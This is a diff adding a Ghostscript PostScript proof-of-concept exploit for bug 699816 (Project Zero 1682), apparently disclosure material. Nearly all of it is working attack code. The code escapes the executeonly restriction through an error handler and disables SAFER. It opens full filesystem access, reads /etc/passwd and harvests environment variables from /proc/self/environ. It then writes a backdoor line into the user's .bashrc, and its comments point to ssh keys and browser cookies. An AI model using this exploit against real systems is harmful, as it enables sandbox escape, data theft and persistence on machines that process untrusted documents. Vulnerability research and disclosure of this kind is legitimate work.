@@ -1,0 +1,70 @@
+%!PS
+%
+% This is ghostscript bug 699816, bypassing executeonly restrictions
+% via error handler.
+%
+% Project Zero bug 1682.
+%
+
+% ;-)
+(what do we want?\n) print
+(\tdeprecate untrusted postscript!\n) print
+(when do we want it?\n) print
+(\tnow!\n) print
+
+% This will make switch_to_normal_marking_ops /typecheck
+/pdfopdict null def
+
+% call switch_to_normal_marking_ops
+GS_PDF_ProcSet /switch_to_normal_marking_ops get stopped pop
+
+% now we have access to forceput
+/forceput $error /command get def
+
+% Now we can do whatever we like, lets disable SAFER and give ourselves access
+% to the whole filesystem (including .bashrc, ssh keys, chrome cookies, everything)
+systemdict /SAFER false forceput
+systemdict /userparams get /PermitFileControl [(*)] forceput
+systemdict /userparams get /PermitFileWriting [(*)] forceput
+systemdict /userparams get /PermitFileReading [(*)] forceput
+
+% Demonstrate reading a file we shouldnt have access to.
+(/etc/passwd) (r) file dup 64 string readline pop == closefile
+
+% The getenv operator gets removed and we can't get it back, here is a
+% replacement.
+% (HOME) newgetenv (/path/to/home) true     % found
+% (foobar) newgetenv false                  % notfound
+/newgetenv {
+    % read entire environment into string
+    (/proc/self/environ) (r) file dup 32768 string readstring pop exch closefile
+
+    % search for variable
+    exch dup (\0) exch concatstrings (=) concatstrings exch 3 1 roll search not {
+        % not found, could be at the start, so no leading nul?
+        1 index (=) concatstrings anchorsearch not {
+            (notfound)
+        } { pop } ifelse
+    } { pop pop } ifelse
+
+    % remove everything after path, there is always a nul on Linux.
+    (\0) search { 4 1 roll pop pop pop true } {
+        % must be the notfound string
+        pop pop pop false
+    } ifelse
+} def
+
+% Here is how to edit .bashrc...
+/backdoorbash {
+    % now we can append to bashrc
+    (HOME) newgetenv pop (/.bashrc) concatstrings (a) file dup
+
+    % backdoor
+    (echo pwned by postscript\n) writestring
+
+    % all done
+    closefile
+} def
+
+backdoorbash
+quit
